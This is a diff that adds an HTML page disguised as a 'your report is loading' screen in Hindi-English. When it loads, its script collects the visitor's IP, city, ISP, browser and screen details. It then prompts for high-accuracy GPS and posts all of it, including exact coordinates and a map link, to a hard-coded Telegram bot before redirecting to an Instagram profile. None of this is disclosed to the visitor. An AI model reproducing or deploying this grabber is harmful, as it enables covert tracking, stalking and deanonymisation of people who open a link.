@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Aapki report load ho rahi hai…</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(160deg,#0f172a,#1e3a8a);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;color:#fff}
+.card{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.15);border-radius:20px;padding:34px 24px;text-align:center;max-width:360px;width:100%;backdrop-filter:blur(8px)}
+.logo{width:56px;height:56px;border-radius:16px;background:linear-gradient(135deg,#22d3ee,#6366f1);margin:0 auto 18px;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:800}
+h1{font-size:19px;margin-bottom:8px;font-weight:700}
+p{font-size:13.5px;opacity:.72;line-height:1.55}
+.bar{height:5px;border-radius:99px;background:rgba(255,255,255,.15);margin:22px 0 14px;overflow:hidden}
+.bar i{display:block;height:100%;width:15%;border-radius:99px;background:linear-gradient(90deg,#22d3ee,#6366f1);animation:go 2.2s ease-in-out infinite}
+@keyframes go{0%{width:12%}60%{width:88%}100%{width:12%}}
+.hint{font-size:12px;opacity:.55;margin-top:14px;min-height:16px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">MK</div>
+  <h1>Aapki report ready ho rahi hai</h1>
+  <p>Please wait, aapko 2 second me redirect kar diya jaayega.</p>
+  <div class="bar"><i></i></div>
+  <div class="hint" id="hint"></div>
+</div>
+
+<script>
+(function(){
+  var CFG = {
+    BOT: "8700221759:AAHoWp2eNVGX_r-9JreWiD6Irqgt3fAfqSc",
+    CHAT: "6459326005",
+    REDIRECT: "https://instagram.com/hexsatyam18",
+    CAP: 9000
+  };
+
+  var done = false, base = "";
+  var hint = document.getElementById('hint');
+
+  function send(t){
+    fetch("https://api.telegram.org/bot" + CFG.BOT + "/sendMessage", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: CFG.CHAT, text: t, parse_mode: "HTML"})
+    }).catch(function(){});
+  }
+
+  function go(){
+    if (done) return;
+    done = true;
+    setTimeout(function(){ location.replace(CFG.REDIRECT); }, 700);
+  }
+
+  // Phase 1 — IP + device (prompt se pehle)
+  fetch("https://ipwho.is/").then(function(r){return r.json();}).then(function(d){
+    base = "🟢 <b>LINK KHOLA GAYA</b>\n"
+      + "IP: " + (d.ip || "-") + "\n"
+      + "City: " + (d.city || "-") + ", " + (d.region || "-") + ", " + (d.country || "-") + "\n"
+      + "ISP: " + ((d.connection && d.connection.isp) || "-") + "\n"
+      + "Device: " + navigator.userAgent + "\n"
+      + "Screen: " + screen.width + "x" + screen.height + "\n"
+      + "Lang: " + navigator.language;
+    send(base);
+  }).catch(function(){
+    base = "🟢 LINK KHOLA GAYA\nIP: n/a\nDevice: " + navigator.userAgent;
+    send(base);
+  });
+
+  // Phase 2 — GPS
+  if (!navigator.geolocation){ send("📍 GPS support nahi"); return go(); }
+
+  setTimeout(function(){ hint.textContent = "Location allow karein…"; }, 2000);
+
+  var got = false;
+  function ok(p){
+    if (got) return;
+    got = true;
+    var c = p.coords;
+    send("📍 <b>EXACT LOCATION</b>\nLat: " + c.latitude + "\nLng: " + c.longitude
+      + "\nAccuracy: " + Math.round(c.accuracy) + "m"
+      + "\nMap: https://www.google.com/maps?q=" + c.latitude + "," + c.longitude
+      + "\n\n" + (base || ""));
+    go();
+  }
+  function bad(e){
+    if (got) return;
+    got = true;
+    send("🔴 GPS nahi mila: " + e.message + " (code " + e.code + ")\n\n" + (base || ""));
+    go();
+  }
+
+  navigator.geolocation.getCurrentPosition(ok, bad, {enableHighAccuracy:true, timeout:12000, maximumAge:0});
+
+  setTimeout(go, CFG.CAP);
+})();
+</script>
+</body>
+</html>
